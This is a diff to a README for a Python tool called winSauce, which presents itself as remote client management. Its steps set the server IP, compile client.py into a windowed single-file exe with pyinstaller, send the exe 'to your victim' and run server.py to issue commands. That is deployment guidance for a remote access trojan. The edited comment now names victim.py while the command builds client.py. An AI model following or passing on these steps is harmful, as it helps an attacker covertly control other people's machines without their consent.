@@ -21,7 +21,7 @@ winSauce is a Python-based tool designed for remote client management. It allows
    nano client.py
    Replace SERVER_IP: In the client.py script, replace '127.0.0.1' with the actual IP address of your server.
 4. Run pyinstaller to create exe file for your updated script.
-   pyinstaller --onefile --windowed client.py    //make sure that you give correct path to your client.py file
+   pyinstaller --onefile --windowed client.py    //make sure that you give correct path to your victim.py file
 5. Now send this exe file to your victim, and run server.py at your computer
    python3 server.py
 6. Execute the commands based on the options listed on the screen.
